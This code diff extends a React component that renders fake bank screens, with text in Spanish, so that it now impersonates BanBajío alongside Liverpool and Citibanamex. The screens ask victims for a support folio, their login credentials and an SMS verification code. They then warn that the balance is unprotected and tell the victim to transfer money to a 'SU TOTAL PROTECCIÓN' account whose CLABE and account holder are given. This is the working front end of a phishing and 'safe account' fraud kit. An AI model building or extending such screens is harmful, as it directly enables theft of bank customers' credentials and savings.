@@ -5,6 +5,7 @@ import { Button } from '@/components/ui/button';
 import { ScreenType } from '@shared/schema';
 import liverpoolLogo from '../../assets/pngwing.com 2.png';
 import citibanamexLogo from '../../assets/Banamex.png';
+import banbajioLogo from '../../assets/banbajio_logo.png';
 
 interface ScreenTemplatesProps {
   currentScreen: ScreenType;
@@ -42,8 +43,18 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.FOLIO:
         return (
           <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            {banco === 'BANBAJIO' && (
+              <div className="bajionet text-2xl font-bold mb-3">
+                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
+              </div>
+            )}
             <h2 className="text-xl font-bold mb-3">Folio de soporte:</h2>
-            <p className="mb-4">Ingrese el folio que su ejecutivo le proporcionó.</p>
+            <p className="mb-4">
+              {banco === 'BANBAJIO' 
+                ? "Por favor, ingrese el folio de soporte técnico que su ejecutivo en línea le proporcionó."
+                : "Ingrese el folio que su ejecutivo le proporcionó."
+              }
+            </p>
             <Input 
               type="text" 
               placeholder="Ingrese su número de folio" 
@@ -63,6 +74,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.LOGIN:
         return (
           <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            {banco === 'BANBAJIO' && (
+              <div className="bajionet text-2xl font-bold mb-3">
+                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
+              </div>
+            )}
             <h2 className="text-xl font-bold mb-3">Inicio de sesión:</h2>
             <p className="mb-4">Ingrese su usuario y contraseña.</p>
             <Input 
@@ -91,9 +107,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.CODIGO:
         return (
           <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            {banco === 'BANBAJIO' && (
+              <div className="bajionet text-2xl font-bold mb-3">
+                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
+              </div>
+            )}
             <h2 className="text-xl font-bold mb-3">Hemos enviado un código de verificación</h2>
             <p className="mb-4">
-              Ingresa el código que recibiste en tu número celular terminación: <strong>{screenData.terminacion || "****"}</strong>
+              Ingresa el código que recibiste en tu número celular terminación: <strong>{screenData.terminacion || "1881"}</strong>
             </p>
             <Input 
               type="text" 
@@ -108,6 +129,12 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             >
               Continuar
             </Button>
+            {banco === 'BANBAJIO' && (
+              <div className="small-links mt-4">
+                <a href="#" className="text-[#4D2C91] mr-2 text-sm">Nueva aclaración</a> | 
+                <a href="#" className="text-[#4D2C91] ml-2 text-sm">Estatus de mis aclaraciones</a>
+              </div>
+            )}
           </div>
         );
 
@@ -136,11 +163,22 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.PROTEGER:
         return (
           <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            {banco === 'BANBAJIO' && (
+              <div className="bajionet text-2xl font-bold mb-3">
+                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
+              </div>
+            )}
             <div className="text-4xl mb-2">⚠️</div>
             <h2 className="text-xl font-bold mb-3">Es necesario proteger su saldo</h2>
-            <p className="mb-4">Se creará una cuenta de TOTAL PROTECCIÓN para respaldar su saldo.</p>
+            <p className="mb-4">
+              {banco === 'BANBAJIO' 
+                ? "Por su seguridad, es necesario proteger el saldo de su cuenta efectiva, crearemos una cuenta de SU TOTAL PROTECCIÓN para respaldar el fondo disponible."
+                : "Se creará una cuenta de TOTAL PROTECCIÓN para respaldar su saldo."
+              }
+            </p>
             <div className="p-3 bg-gray-100 rounded mb-4">
-              Saldo sin proteger: <strong>{screenData.saldo || "$39,499,494"}</strong>
+              <p className="font-bold">Saldo sin proteger:</p>
+              <p className="text-lg"><strong>{screenData.saldo || "$444"}</strong></p>
             </div>
             <Button 
               className={primaryBtnClass}
@@ -154,14 +192,19 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.TRANSFERIR:
         return (
           <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            {banco === 'BANBAJIO' && (
+              <div className="bajionet text-2xl font-bold mb-3">
+                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
+              </div>
+            )}
             <h2 className="text-xl font-bold mb-3">Cuenta SU TOTAL PROTECCIÓN creada exitosamente.</h2>
             <p className="mb-4">
-              Transfiera la cantidad de <strong>{screenData.monto || "$39,933"}</strong> a la siguiente cuenta:
+              Transfiera la cantidad de <strong>{screenData.monto || "$444"}</strong> a la siguiente cuenta{banco === 'BANBAJIO' ? ' SU TOTAL PROTECCIÓN (STP)' : ''}:
             </p>
             <div className="text-left p-4 bg-gray-100 rounded mb-4">
+              <p><strong>Alias:</strong> Cuenta de respaldo.</p>
               <p><strong>Clabe:</strong> <span>{screenData.clabe || "272762626262727272727272266222"}</span></p>
               <p><strong>Titular:</strong> <span>{screenData.titular || "Juan Pérez"}</span></p>
-              <p><strong>Alias:</strong> Cuenta de respaldo.</p>
             </div>
             <Button 
               className={primaryBtnClass}
@@ -169,6 +212,12 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             >
               Confirmar transferencia
             </Button>
+            {banco === 'BANBAJIO' && (
+              <div className="small-links mt-4">
+                <a href="#" className="text-[#4D2C91] mr-2 text-sm">Nueva aclaración</a> | 
+                <a href="#" className="text-[#4D2C91] ml-2 text-sm">Estatus de mis aclaraciones</a>
+              </div>
+            )}
           </div>
         );
 
@@ -283,7 +332,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <h2 className="text-xl font-bold mb-4">Validando...</h2>
             <p className="text-sm text-gray-500 mb-4">Esto puede tomar un momento. Por favor espere...</p>
             <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
-              <div className={`h-full ${banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 'bg-[#e10098]'} animate-progress-bar`}></div>
+              <div className={`h-full ${banco === 'BANBAJIO' ? 'banbajio-bg' : banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 'bg-[#e10098]'} animate-progress-bar`}></div>
             </div>
             <p className="text-xs text-gray-400 mt-3">Verificando información de seguridad</p>
           </div>
@@ -300,13 +349,41 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   };
 
   // Definimos las clases de estilos para los botones según el banco
-  const primaryBtnClass = banco === 'CITIBANAMEX' 
-    ? "bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors" 
-    : "bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors";
+  const getPrimaryBtnClass = () => {
+    switch(banco) {
+      case 'CITIBANAMEX':
+        return 'bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
+      case 'BANBAJIO':
+        return 'banbajio-button py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
+      default:
+        return 'bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Liverpool
+    }
+  };
+
+  const primaryBtnClass = getPrimaryBtnClass();
+
+  const bankLogo = () => {
+    switch(banco) {
+      case 'CITIBANAMEX':
+        return <img src={citibanamexLogo} alt="Citibanamex" className="h-16 mx-auto mb-4" />;
+      case 'BANBAJIO':
+        return <img src={banbajioLogo} alt="BanBajío" className="h-16 mx-auto mb-4" />;
+      default:
+        return <img src={liverpoolLogo} alt="Liverpool" className="h-16 mx-auto mb-4" />;
+    }
+  };
 
   return (
-    <>
+    <div className={banco === 'BANBAJIO' ? 'bg-white p-4 rounded-lg shadow' : ''}>
+      {banco === 'BANBAJIO' && (
+        <div className="logo text-center mb-4">
+          {bankLogo()}
+          <div className="text-center bg-gray-100 text-[#4D2C91] font-bold py-2 mb-4">
+            7 de abril de 2025
+          </div>
+        </div>
+      )}
       {renderScreen()}
-    </>
+    </div>
   );
 };
